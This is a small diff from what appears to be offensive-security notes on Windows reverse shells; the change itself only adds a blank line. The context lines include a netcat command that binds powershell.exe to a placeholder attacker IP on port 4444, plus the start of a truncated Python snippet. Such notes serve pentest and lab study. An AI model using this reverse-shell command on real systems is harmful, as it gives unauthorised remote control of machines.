@@ -65,6 +65,7 @@ Windows reverse shell
 - Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
 - `C:\Windows\Temp\nc.exe -e powershell.exe {kali_IP} 4444` Powershell reverse shell
 - Can also just do it with powershell alone:
+
 ```
 import base64
 import sys
